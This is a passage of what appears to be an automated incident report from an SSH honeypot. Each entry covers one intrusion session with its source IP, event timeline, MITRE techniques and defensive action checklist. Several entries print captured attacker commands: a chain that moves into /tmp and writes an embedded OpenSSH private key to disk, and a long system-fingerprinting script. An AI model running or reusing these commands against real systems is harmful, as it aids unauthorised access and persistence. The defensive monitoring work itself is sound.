| **Last Seen** | 2026-08-23 11:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:42:44` | `cowrie.session.connect` |
| `2026-08-23 11:42:45` | `cowrie.client.version` |
| `2026-08-23 11:42:45` | `cowrie.client.kex` |
| `2026-08-23 11:42:47` | `cowrie.login.success` |
| `2026-08-23 11:42:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.76.248[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.76.248[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b63a0ebbc60

| Field | Detail |
|---|---|
| **Source IP** | `46.4.112[.]25` |
| **First Seen** | 2026-08-23 11:42 |
| **Last Seen** | 2026-08-23 11:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:42:53` | `cowrie.session.connect` |
| `2026-08-23 11:42:54` | `cowrie.client.version` |
| `2026-08-23 11:42:54` | `cowrie.client.kex` |
| `2026-08-23 11:42:54` | `cowrie.login.success` |
| `2026-08-23 11:42:55` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.4.112[.]25` to AbuseIPDB if not already reported
- [ ] Block `46.4.112[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e93d0b9445

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-08-23 11:45 |
| **Last Seen** | 2026-08-23 11:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:45:22` | `cowrie.session.connect` |
| `2026-08-23 11:45:23` | `cowrie.client.version` |
| `2026-08-23 11:45:23` | `cowrie.client.kex` |
| `2026-08-23 11:45:26` | `cowrie.login.success` |
| `2026-08-23 11:45:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a8c208be94

| Field | Detail |
|---|---|
| **Source IP** | `183.247.171[.]186` |
| **First Seen** | 2026-08-23 11:45 |
| **Last Seen** | 2026-08-23 11:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:45:37` | `cowrie.session.connect` |
| `2026-08-23 11:45:37` | `cowrie.client.version` |
| `2026-08-23 11:45:37` | `cowrie.client.kex` |
| `2026-08-23 11:45:41` | `cowrie.login.success` |
| `2026-08-23 11:45:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.247.171[.]186` to AbuseIPDB if not already reported
- [ ] Block `183.247.171[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039c81806315

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:51 |
| **Last Seen** | 2026-08-23 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:51:02` | `cowrie.session.connect` |
| `2026-08-23 11:51:02` | `cowrie.client.version` |
| `2026-08-23 11:51:02` | `cowrie.client.kex` |
| `2026-08-23 11:51:03` | `cowrie.login.success` |
| `2026-08-23 11:51:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:51:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:51:03` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8effe75c722f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:51 |
| **Last Seen** | 2026-08-23 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:51:05` | `cowrie.session.connect` |
| `2026-08-23 11:51:05` | `cowrie.client.version` |
| `2026-08-23 11:51:05` | `cowrie.client.kex` |
| `2026-08-23 11:51:06` | `cowrie.login.success` |
| `2026-08-23 11:51:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:51:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:51:06` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ca6c391b5d6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:00 |
| **Last Seen** | 2026-08-23 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:00:35` | `cowrie.session.connect` |
| `2026-08-23 12:00:35` | `cowrie.client.version` |
| `2026-08-23 12:00:35` | `cowrie.client.kex` |
| `2026-08-23 12:00:36` | `cowrie.login.success` |
| `2026-08-23 12:00:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:00:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:00:36` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcce9d5c148d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:00 |
| **Last Seen** | 2026-08-23 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:00:39` | `cowrie.session.connect` |
| `2026-08-23 12:00:39` | `cowrie.client.version` |
| `2026-08-23 12:00:39` | `cowrie.client.kex` |
| `2026-08-23 12:00:40` | `cowrie.login.success` |
| `2026-08-23 12:00:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:00:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:00:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57455d6f17c2

| Field | Detail |
|---|---|
| **Source IP** | `14.153.252[.]114` |
| **First Seen** | 2026-08-23 12:00 |
| **Last Seen** | 2026-08-23 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:00:51` | `cowrie.session.connect` |
| `2026-08-23 12:00:53` | `cowrie.client.version` |
| `2026-08-23 12:00:53` | `cowrie.client.kex` |
| `2026-08-23 12:00:56` | `cowrie.login.success` |
| `2026-08-23 12:00:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.252[.]114` to AbuseIPDB if not already reported
- [ ] Block `14.153.252[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e41175e63f1

| Field | Detail |
|---|---|
| **Source IP** | `202.88.236[.]38` |
| **First Seen** | 2026-08-23 12:01 |
| **Last Seen** | 2026-08-23 12:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:01:02` | `cowrie.session.connect` |
| `2026-08-23 12:01:03` | `cowrie.client.version` |
| `2026-08-23 12:01:03` | `cowrie.client.kex` |
| `2026-08-23 12:01:05` | `cowrie.login.success` |
| `2026-08-23 12:01:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.88.236[.]38` to AbuseIPDB if not already reported
- [ ] Block `202.88.236[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc798952385e

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-08-23 12:05 |
| **Last Seen** | 2026-08-23 12:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:05:18` | `cowrie.session.connect` |
| `2026-08-23 12:05:18` | `cowrie.client.version` |
| `2026-08-23 12:05:18` | `cowrie.client.kex` |
| `2026-08-23 12:05:20` | `cowrie.login.success` |
| `2026-08-23 12:05:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2480b710f956

| Field | Detail |
|---|---|
| **Source IP** | `138.68.108[.]72` |
| **First Seen** | 2026-08-23 12:07 |
| **Last Seen** | 2026-08-23 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:07:39` | `cowrie.session.connect` |
| `2026-08-23 12:07:39` | `cowrie.client.version` |
| `2026-08-23 12:07:39` | `cowrie.client.kex` |
| `2026-08-23 12:07:41` | `cowrie.login.success` |
| `2026-08-23 12:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.108[.]72` to AbuseIPDB if not already reported
- [ ] Block `138.68.108[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628ec0eb77a7

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-23 12:07 |
| **Last Seen** | 2026-08-23 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:07:42` | `cowrie.session.connect` |
| `2026-08-23 12:07:42` | `cowrie.client.version` |
| `2026-08-23 12:07:42` | `cowrie.client.kex` |
| `2026-08-23 12:07:42` | `cowrie.login.success` |
| `2026-08-23 12:07:44` | `cowrie.session.params` |
| `2026-08-23 12:07:44` | `cowrie.command.input` |
| `2026-08-23 12:07:44` | `cowrie.session.file_download` |
| `2026-08-23 12:07:44` | `cowrie.session.file_download` |
| `2026-08-23 12:07:44` | `cowrie.log.closed` |
| `2026-08-23 12:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6cf64f1bb2

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-08-23 12:09 |
| **Last Seen** | 2026-08-23 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:09:59` | `cowrie.session.connect` |
| `2026-08-23 12:09:59` | `cowrie.client.version` |
| `2026-08-23 12:09:59` | `cowrie.client.kex` |
| `2026-08-23 12:09:59` | `cowrie.login.success` |
| `2026-08-23 12:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-355a6a4fafa5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-23 12:10 |
| **Last Seen** | 2026-08-23 12:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:10:00` | `cowrie.session.connect` |
| `2026-08-23 12:10:00` | `cowrie.client.version` |
| `2026-08-23 12:10:00` | `cowrie.client.kex` |
| `2026-08-23 12:10:00` | `cowrie.login.success` |
| `2026-08-23 12:10:02` | `cowrie.session.params` |
| `2026-08-23 12:10:02` | `cowrie.command.input` |
| `2026-08-23 12:10:02` | `cowrie.session.file_download` |
| `2026-08-23 12:10:02` | `cowrie.session.file_download` |
| `2026-08-23 12:10:02` | `cowrie.log.closed` |
| `2026-08-23 12:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1ce10b1d0a

| Field | Detail |
|---|---|
| **Source IP** | `45.55.133[.]80` |
| **First Seen** | 2026-08-23 12:10 |
| **Last Seen** | 2026-08-23 12:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:10:11` | `cowrie.session.connect` |
| `2026-08-23 12:10:12` | `cowrie.client.version` |
| `2026-08-23 12:10:12` | `cowrie.client.kex` |
| `2026-08-23 12:10:12` | `cowrie.login.success` |
| `2026-08-23 12:10:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.55.133[.]80` to AbuseIPDB if not already reported
- [ ] Block `45.55.133[.]80` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687820a1a7cb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:10 |
| **Last Seen** | 2026-08-23 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:10:12` | `cowrie.session.connect` |
| `2026-08-23 12:10:12` | `cowrie.client.version` |
| `2026-08-23 12:10:12` | `cowrie.client.kex` |
| `2026-08-23 12:10:13` | `cowrie.login.success` |
| `2026-08-23 12:10:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:10:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:10:14` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2adf2caa6d44

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:10 |
| **Last Seen** | 2026-08-23 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:10:16` | `cowrie.session.connect` |
| `2026-08-23 12:10:16` | `cowrie.client.version` |
| `2026-08-23 12:10:16` | `cowrie.client.kex` |
| `2026-08-23 12:10:17` | `cowrie.login.success` |
| `2026-08-23 12:10:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:10:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:10:17` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7ee51b4ee8

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-23 12:10 |
| **Last Seen** | 2026-08-23 12:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:10:18` | `cowrie.session.connect` |
| `2026-08-23 12:10:18` | `cowrie.client.version` |
| `2026-08-23 12:10:18` | `cowrie.client.kex` |
| `2026-08-23 12:10:20` | `cowrie.login.success` |
| `2026-08-23 12:10:21` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3776760efa12

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:11 |
| **Last Seen** | 2026-08-23 12:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:11:26` | `cowrie.session.connect` |
| `2026-08-23 12:11:26` | `cowrie.client.version` |
| `2026-08-23 12:11:26` | `cowrie.client.kex` |
| `2026-08-23 12:11:30` | `cowrie.login.success` |
| `2026-08-23 12:11:32` | `cowrie.session.params` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.success` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:32` | `cowrie.command.input` |
| `2026-08-23 12:11:33` | `cowrie.log.closed` |
| `2026-08-23 12:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b0bb9e51c3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:13 |
| **Last Seen** | 2026-08-23 12:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:13:54` | `cowrie.session.connect` |
| `2026-08-23 12:13:54` | `cowrie.client.version` |
| `2026-08-23 12:13:54` | `cowrie.client.kex` |
| `2026-08-23 12:13:57` | `cowrie.login.success` |
| `2026-08-23 12:13:59` | `cowrie.session.params` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.success` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:13:59` | `cowrie.command.input` |
| `2026-08-23 12:14:00` | `cowrie.log.closed` |
| `2026-08-23 12:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
